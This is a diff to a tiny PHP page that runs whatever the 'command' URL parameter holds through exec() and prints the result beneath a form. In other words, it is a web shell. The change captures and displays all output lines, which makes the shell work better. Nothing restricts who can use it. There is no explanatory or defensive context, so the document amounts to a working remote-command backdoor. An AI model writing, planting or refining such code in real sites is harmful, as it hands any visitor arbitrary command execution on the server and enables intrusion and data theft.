@@ -1,6 +1,6 @@
 <?php
     if(isset($_GET['command'])){
-        $result=exec($_GET['command']);
+        exec($_GET['command'],$result);
     }
 ?>
 <form method="GET">
@@ -9,6 +9,8 @@
 </form>
 <?php
     if($result){
-        echo $result;
+        foreach($result as $e){
+            echo $e."<br>";
+        }
     }
 ?>
